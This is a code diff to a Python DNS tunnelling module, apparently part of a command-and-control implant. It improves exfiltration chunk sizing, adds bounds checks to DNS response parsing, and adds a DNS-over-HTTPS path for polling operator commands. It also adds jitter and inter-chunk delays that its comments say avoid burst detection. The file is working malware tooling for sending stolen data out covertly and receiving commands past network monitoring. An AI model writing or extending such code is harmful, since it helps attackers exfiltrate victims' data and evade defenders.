@@ -35,6 +35,7 @@ from __future__ import annotations
 
 import base64
 import hashlib
+import json as _json
 import logging
 import os
 import random
@@ -42,6 +43,8 @@ import socket
 import struct
 import time
 import threading
+import urllib.request
+import urllib.error
 from typing import Any
 
 from c2.protocol import C2Protocol, C2Message, MessageType
@@ -87,11 +90,10 @@ def _build_dns_query(domain: str, qtype: int = _QUERY_TYPE_TXT) -> bytes:
     for label in domain.split("."):
         encoded = label.encode("ascii")
         if len(encoded) > _MAX_LABEL_LENGTH:
-            logger.warning(
-                "DNS label exceeds %d bytes (%d), query may be malformed: %.20s...",
-                _MAX_LABEL_LENGTH, len(encoded), label,
+            raise ValueError(
+                f"DNS label exceeds {_MAX_LABEL_LENGTH} bytes "
+                f"({len(encoded)}): {label!r:.40}"
             )
-            encoded = encoded[:_MAX_LABEL_LENGTH]
         qname += struct.pack("!B", len(encoded)) + encoded
     qname += b"\x00"  # root label
 
@@ -116,15 +118,21 @@ def _parse_dns_response(data: bytes) -> list[str]:
 
         # Skip question section
         offset = 12
-        # Skip QNAME
+        # Skip QNAME (with bounds checking to prevent buffer overshoot)
         while offset < len(data) and data[offset] != 0:
             if data[offset] & 0xC0 == 0xC0:
                 offset += 2
                 break
-            offset += data[offset] + 1
+            label_len = data[offset]
+            if offset + label_len + 1 > len(data):
+                return txt_records  # truncated packet
+            offset += label_len + 1
         else:
-            offset += 1
+            if offset < len(data):
+                offset += 1
         # Skip QTYPE and QCLASS
+        if offset + 4 > len(data):
+            return txt_records
         offset += 4
 
         # Parse answer section
@@ -132,13 +140,17 @@ def _parse_dns_response(data: bytes) -> list[str]:
             if offset >= len(data):
                 break
 
-            # Skip NAME (may be compressed)
+            # Skip NAME (may be compressed, with bounds checking)
             if data[offset] & 0xC0 == 0xC0:
                 offset += 2
             else:
                 while offset < len(data) and data[offset] != 0:
-                    offset += data[offset] + 1
-                offset += 1
+                    label_len = data[offset]
+                    if offset + label_len + 1 > len(data):
+                        break  # truncated packet
+                    offset += label_len + 1
+                if offset < len(data):
+                    offset += 1
 
             if offset + 10 > len(data):
                 break
@@ -180,6 +192,7 @@ class DNSTunnel:
         - ``shared_key``: 32-byte key for message encryption (hex string)
         - ``poll_interval``: seconds between command polls (default: 60)
         - ``jitter``: timing jitter factor (default: 0.3)
+        - ``use_doh``: use DNS-over-HTTPS instead of raw DNS (default: False)
     """
 
     def __init__(self, config: dict[str, Any] | None = None) -> None:
@@ -189,9 +202,25 @@ class DNSTunnel:
         self._poll_interval: float = float(cfg.get("poll_interval", 60))
         self._jitter: float = float(cfg.get("jitter", 0.3))
 
+        # Validate domain labels and total length up-front.
+        for label in self._domain.split("."):
+            lbl_len = len(label.encode("ascii"))
+            if lbl_len > _MAX_LABEL_LENGTH:
+                raise ValueError(
+                    f"Domain label exceeds {_MAX_LABEL_LENGTH} bytes "
+                    f"({lbl_len}): {label!r:.40}"
+                )
+        if len(self._domain) > _MAX_DOMAIN_LENGTH:
+            raise ValueError(
+                f"Domain exceeds {_MAX_DOMAIN_LENGTH} bytes "
+                f"({len(self._domain)}): {self._domain!r:.60}"
+            )
+
         key_hex = str(cfg.get("shared_key", ""))
         shared_key = bytes.fromhex(key_hex) if key_hex else None
         self._protocol = C2Protocol(shared_key=shared_key)
+
+        self._use_doh: bool = bool(cfg.get("use_doh", False))
 
         self._session_id = hashlib.sha256(os.urandom(16)).hexdigest()[:8]
         self._agent_id: str = str(cfg.get("agent_id", ""))
@@ -231,27 +260,18 @@ class DNSTunnel:
             payload={"type": data_type, "data": base64.b64encode(data).decode()},
         ))
 
-        # Compute max raw bytes per query from actual domain overhead.
-        # Full domain: "{subdomain}.{i}.{total}.{session_id}.{domain}"
-        # Use 4-digit upper bound for chunk index and total count.
-        suffix_overhead = (
-            1 + 4           # ".{i}"   — dot + up to 4 digits
-            + 1 + 4         # ".{total}"
-            + 1 + len(self._session_id)
-            + 1 + len(self._domain)
-        )
-        max_subdomain_len = _MAX_DOMAIN_LENGTH - suffix_overhead
-        if max_subdomain_len < 10:
-            logger.debug("DNS domain too long for exfil: overhead=%d", suffix_overhead)
+        # Iteratively compute max chunk size: start with a rough estimate,
+        # then refine once we know the actual chunk count (which affects
+        # the digit-width of index/total fields in the domain).
+        initial_max = self._compute_max_chunk_bytes(num_chunks=1)
+        if initial_max <= 0:
+            logger.debug("DNS domain too long for exfil")
             return False
-
-        # Subdomain = base32 chars split into 60-char labels joined by dots.
-        # Length = n_b32 + (ceil(n_b32/60) - 1) dots.
-        # Solving: n_b32 + ceil(n_b32/60) - 1 <= max_subdomain_len
-        #   ⇒ n_b32 <= (max_subdomain_len + 1) * 60 / 61  (conservative)
-        max_b32_chars = int((max_subdomain_len + 1) * 60 / 61)
-        # Base32: 5 raw bytes → 8 encoded chars
-        max_data_per_query = max(1, (max_b32_chars * 5) // 8)
+        estimated_num_chunks = max(1, -(-len(encoded) // initial_max))  # ceil div
+        max_data_per_query = self._compute_max_chunk_bytes(num_chunks=estimated_num_chunks)
+        if max_data_per_query <= 0:
+            logger.debug("DNS domain too long for exfil after chunk estimation")
+            return False
 
         chunks = C2Protocol.chunk_data(encoded, max_data_per_query)
 
@@ -270,7 +290,9 @@ class DNSTunnel:
                 return False
 
             # Small delay between chunks to avoid burst detection
-            time.sleep(random.uniform(0.1, 0.5))
+            self._stop_event.wait(random.uniform(0.1, 0.5))
+            if self._stop_event.is_set():
+                return False
 
         return True
 
@@ -281,6 +303,12 @@ class DNSTunnel:
         polling domain: ``<agent_id>.<session_id>.cmd.<domain>``
         """
         poll_domain = f"{self._agent_id}.{self._session_id}.cmd.{self._domain}"
+
+        if len(poll_domain) > _MAX_DOMAIN_LENGTH:
+            raise ValueError(
+                f"Poll domain exceeds {_MAX_DOMAIN_LENGTH} bytes "
+                f"({len(poll_domain)}): {poll_domain!r:.60}"
+            )
 
         try:
             txt_records = self._query_txt(poll_domain)
@@ -334,6 +362,41 @@ class DNSTunnel:
 
     # ── Internal methods ─────────────────────────────────────────────
 
+    def _compute_max_chunk_bytes(self, num_chunks: int = 1) -> int:
+        """Compute the maximum raw data bytes that fit in one DNS chunk query.
+
+        The full query domain looks like:
+            ``{subdomain}.{i}.{total}.{session_id}.{domain}``
+
+        We use the actual digit-width of *num_chunks* (and the chunk index)
+        rather than a hardcoded constant so the calculation stays accurate
+        regardless of how many chunks are produced.
+
+        Returns the max raw byte count (before base32 encoding) that can be
+        placed in the subdomain portion, or 0 if the domain overhead is too
+        large.
+        """
+        # Digit width for chunk index/total — worst-case index is num_chunks-1
+        idx_digits = len(str(max(num_chunks - 1, 0)))
+        total_digits = len(str(num_chunks))
+        suffix_overhead = (
+            1 + idx_digits          # ".{i}"
+            + 1 + total_digits      # ".{total}"
+            + 1 + len(self._session_id)
+            + 1 + len(self._domain)
+        )
+        max_subdomain_len = _MAX_DOMAIN_LENGTH - suffix_overhead
+        if max_subdomain_len < 10:
+            return 0
+
+        # Subdomain = base32 chars split into 60-char labels joined by dots.
+        # Length = n_b32 + (ceil(n_b32/60) - 1) dots.
+        # Solving: n_b32 + ceil(n_b32/60) - 1 <= max_subdomain_len
+        #   ⇒ n_b32 <= (max_subdomain_len + 1) * 60 / 61  (conservative)
+        max_b32_chars = int((max_subdomain_len + 1) * 60 / 61)
+        # Base32: 5 raw bytes → 8 encoded chars
+        return max(1, (max_b32_chars * 5) // 8)
+
     def _send_message(self, msg: C2Message) -> bool:
         """Encode and send a C2 message via DNS query."""
         encoded = self._protocol.encode(msg)
@@ -354,7 +417,16 @@ class DNSTunnel:
     def _send_chunked(self, msg: C2Message) -> bool:
         """Send a large message as multiple DNS queries."""
         encoded = self._protocol.encode(msg)
-        chunks = C2Protocol.chunk_data(encoded, 120)
+        initial_max = self._compute_max_chunk_bytes(num_chunks=1)
+        if initial_max <= 0:
+            logger.debug("DNS domain too long for chunked send")
+            return False
+        estimated_num_chunks = max(1, -(-len(encoded) // initial_max))
+        chunk_size = self._compute_max_chunk_bytes(num_chunks=estimated_num_chunks)
+        if chunk_size <= 0:
+            logger.debug("DNS domain too long for chunked send after estimation")
+            return False
+        chunks = C2Protocol.chunk_data(encoded, chunk_size)
 
         for i, chunk in enumerate(chunks):
             chunk_b32 = _base32_encode(chunk)
@@ -369,7 +441,9 @@ class DNSTunnel:
             if not self._send_dns_query(domain):
                 return False
 
-            time.sleep(random.uniform(0.05, 0.2))
+            self._stop_event.wait(random.uniform(0.05, 0.2))
+            if self._stop_event.is_set():
+                return False
 
         return True
 
@@ -400,7 +474,23 @@ class DNSTunnel:
                 sock.close()
 
     def _query_txt(self, domain: str) -> list[str]:
-        """Query DNS TXT records for a domain."""
+        """Query DNS TXT records for a domain.
+
+        When ``use_doh`` is enabled in the config, queries are sent as
+        DNS-over-HTTPS requests first, falling back to raw DNS on failure.
+        """
+        if self._use_doh:
+            try:
+                results = self._query_txt_doh(domain)
+                if results:
+                    return results
+            except Exception as exc:
+                logger.debug("DoH query failed, falling back to raw DNS: %s", exc)
+
+        return self._query_txt_raw(domain)
+
+    def _query_txt_raw(self, domain: str) -> list[str]:
+        """Query DNS TXT records via traditional raw UDP DNS."""
         sock = None
         try:
             packet = _build_dns_query(domain, _QUERY_TYPE_TXT)
@@ -420,6 +510,59 @@ class DNSTunnel:
             if sock is not None:
                 sock.close()
 
+    def _query_txt_doh(self, domain: str) -> list[str]:
+        """Query DNS TXT records via DNS-over-HTTPS (DoH).
+
+        Attempts Cloudflare DoH first, then falls back to Google DoH.
+        Uses the ``application/dns-json`` wire format for easy parsing.
+
+        Parameters
+        ----------
+        domain : str
+            The domain name to query TXT records for.
+
+        Returns
+        -------
+        list[str]
+            Extracted TXT record values, or an empty list on failure.
+        """
+        doh_endpoints = [
+            "https://cloudflare-dns.com/dns-query",
+            "https://dns.google/dns-query",
+        ]
+
+        headers = {
+            "Accept": "application/dns-json",
+        }
+
+        for endpoint in doh_endpoints:
+            try:
+                url = f"{endpoint}?name={domain}&type=TXT"
+                req = urllib.request.Request(url, headers=headers, method="GET")
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    body = resp.read().decode("utf-8")
+
+                data = _json.loads(body)
+                txt_records: list[str] = []
+
+                for answer in data.get("Answer", []):
+                    # Type 16 = TXT
+                    if answer.get("type") == 16:
+                        txt_data = answer.get("data", "")
+                        # DoH JSON responses wrap TXT data in quotes
+                        txt_data = txt_data.strip('"')
+                        if txt_data:
+                            txt_records.append(txt_data)
+
+                return txt_records
+
+            except (urllib.error.URLError, urllib.error.HTTPError, OSError,
+                    ValueError, KeyError) as exc:
+                logger.debug("DoH endpoint %s failed: %s", endpoint, exc)
+                continue
+
+        return []
+
     def _poll_loop(self) -> None:
         """Background polling loop for commands."""
         while not self._stop_event.is_set():
@@ -438,13 +581,49 @@ class DNSTunnel:
 
     @staticmethod
     def _get_system_nameserver() -> str:
-        """Get the system's configured DNS nameserver."""
+        """Get the system's configured DNS nameserver.
+
+        Attempts platform-specific resolution:
+        1. Linux/macOS: parse ``/etc/resolv.conf``
+        2. Windows: read from the registry
+           (``HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters``)
+        3. Absolute fallback: ``8.8.8.8`` with a warning.
+        """
+        # 1) Linux / macOS — /etc/resolv.conf
         try:
-            # Try /etc/resolv.conf (Linux/macOS)
             with open("/etc/resolv.conf", "r") as f:
                 for line in f:
                     if line.strip().startswith("nameserver"):
-                        return line.split()[1]
+                        parts = line.split()
+                        if len(parts) >= 2 and parts[1]:
+                            return parts[1]
         except Exception:
             pass
-        return "8.8.8.8"  # fallback to Google DNS
+
+        # 2) Windows — registry query
+        if os.name == "nt":
+            try:
+                import winreg  # type: ignore[import-untyped]
+
+                reg_path = (
+                    r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
+                )
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
+                    for value_name in ("NameServer", "DhcpNameServer"):
+                        try:
+                            val, _ = winreg.QueryValueEx(key, value_name)
+                            if val:
+                                # May be space- or comma-separated; take first
+                                ns = val.replace(",", " ").split()[0]
+                                if ns:
+                                    return ns
+                        except OSError:
+                            continue
+            except Exception:
+                pass
+
+        # 3) Absolute last resort
+        logger.warning(
+            "Could not determine system nameserver; falling back to 8.8.8.8"
+        )
+        return "8.8.8.8"
